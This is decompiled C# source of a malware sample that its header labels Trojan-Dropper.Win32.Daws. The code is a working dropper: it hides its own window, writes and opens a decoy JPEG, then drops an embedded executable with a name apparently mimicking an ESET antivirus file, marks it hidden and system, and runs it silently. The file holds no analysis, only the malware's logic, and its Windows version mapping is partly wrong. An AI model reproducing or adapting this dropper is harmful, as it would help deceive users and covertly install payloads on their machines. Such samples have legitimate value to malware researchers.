// Decompiled with JetBrains decompiler
// Type: Form1
// Assembly: poza1, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 6A7474CC-5719-4A7B-9223-7C0281A0CDB3
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Dropper.Win32.Daws.cnp-89a36a7cd5f0053348a33f59a4ec9118e4d0e07af8f8b52e2c708a05a4260ba2.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

[DesignerGenerated]
public class Form1 : Form
{
  private static List<WeakReference> __ENCList = new List<WeakReference>();
  private IContainer components;

  [DebuggerNonUserCode]
  static Form1()
  {
  }

  [DebuggerNonUserCode]
  public Form1()
  {
    this.Load += new EventHandler(this.Form1_Load);
    lock (Form1.__ENCList)
      Form1.__ENCList.Add(new WeakReference((object) this));
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.components == null)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.SuspendLayout();
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.ClientSize = new Size(2, 4);
    this.ControlBox = false;
    this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
    this.Name = nameof (Form1);
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.WindowState = FormWindowState.Minimized;
    this.ResumeLayout(false);
  }

  private void Form1_Load(object sender, EventArgs e)
  {
    this.Size = new Size(0, 0);
    this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
    this.WindowState = FormWindowState.Minimized;
    this.ShowInTaskbar = false;
    this.Visible = false;
    FileAttributes fileAttributes1 = FileAttributes.System;
    FileAttributes fileAttributes2 = FileAttributes.Hidden;
    if (Operators.CompareString(this.GetOSVersion(), "Windows XP", false) == 0 | Operators.CompareString(this.GetOSVersion(), "Windows 2000", false) == 0 | Operators.CompareString(this.GetOSVersion(), "Windows 2003", false) == 0)
    {
      My.Resources.Resources.DSC00129.Save(Environment.GetEnvironmentVariable("systemroot") + "\\DSC00129.jpg");
      File.SetAttributes(Environment.GetEnvironmentVariable("systemroot") + "\\DSC00129.jpg", (FileAttributes) Conversions.ToInteger(Conversions.ToString((int) fileAttributes1) + Conversions.ToString((int) fileAttributes2)));
      Process.Start(Environment.GetEnvironmentVariable("systemroot") + "\\DSC00129.jpg");
      if (!MyProject.Computer.FileSystem.FileExists(Environment.GetEnvironmentVariable("systemroot") + "\\esetnkrv.exe"))
      {
        MyProject.Computer.FileSystem.WriteAllBytes(Environment.GetEnvironmentVariable("systemroot") + "\\esetnkrv.exe", My.Resources.Resources.esetnkrv, true);
        File.SetAttributes(Environment.GetEnvironmentVariable("systemroot") + "\\esetnkrv.exe", (FileAttributes) Conversions.ToInteger(Conversions.ToString((int) fileAttributes1) + Conversions.ToString((int) fileAttributes2)));
        Interaction.Shell(Environment.GetEnvironmentVariable("systemroot") + "\\esetnkrv.exe", AppWinStyle.MinimizedNoFocus);
        ProjectData.EndApp();
      }
    }
    else
    {
      My.Resources.Resources.DSC00129.Save(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DSC00129.jpg");
      File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DSC00129.jpg", (FileAttributes) Conversions.ToInteger(Conversions.ToString((int) fileAttributes1) + Conversions.ToString((int) fileAttributes2)));
      Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DSC00129.jpg");
      if (!MyProject.Computer.FileSystem.FileExists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\esetnkrv.exe"))
      {
        MyProject.Computer.FileSystem.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\esetnkrv.exe", My.Resources.Resources.esetnkrv, true);
        File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\esetnkrv.exe", (FileAttributes) Conversions.ToInteger(Conversions.ToString((int) fileAttributes1) + Conversions.ToString((int) fileAttributes2)));
        Interaction.Shell(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\esetnkrv.exe", AppWinStyle.MinimizedNoFocus);
        ProjectData.EndApp();
      }
    }
    ProjectData.EndApp();
  }

  internal string GetOSVersion()
  {
    string osVersion = "Unknown";
    switch (Environment.OSVersion.Platform)
    {
      case PlatformID.Win32S:
        osVersion = "Windows 3.1";
        break;
      case PlatformID.Win32Windows:
        switch (Environment.OSVersion.Version.Minor)
        {
          case 0:
            osVersion = "Windows 95";
            break;
          case 10:
            osVersion = Operators.CompareString(Environment.OSVersion.Version.Revision.ToString(), "2222A", false) != 0 ? "Windows 98" : "Windows 98 Second Edition";
            break;
          case 90:
            osVersion = "Windows ME";
            break;
        }
        break;
      case PlatformID.Win32NT:
        switch (Environment.OSVersion.Version.Major)
        {
          case 3:
            osVersion = "Windows NT 3.51";
            break;
          case 4:
            osVersion = "Windows NT 4.0";
            break;
          case 5:
            switch (Environment.OSVersion.Version.Minor)
            {
              case 0:
                osVersion = "Windows 2000";
                break;
              case 1:
                osVersion = "Windows XP";
                break;
              case 2:
                osVersion = "Windows 2003";
                break;
            }
            break;
          case 6:
            switch (Environment.OSVersion.Version.Minor)
            {
              case 0:
                osVersion = "Windows Vista";
                break;
              case 1:
                osVersion = "Windows 2008";
                break;
              case 2:
                osVersion = "Windows 7";
                break;
            }
            break;
        }
        break;
      case PlatformID.WinCE:
        osVersion = "Windows CE";
        break;
      case PlatformID.Unix:
        osVersion = "Unix";
        break;
    }
    return osVersion;
  }
}
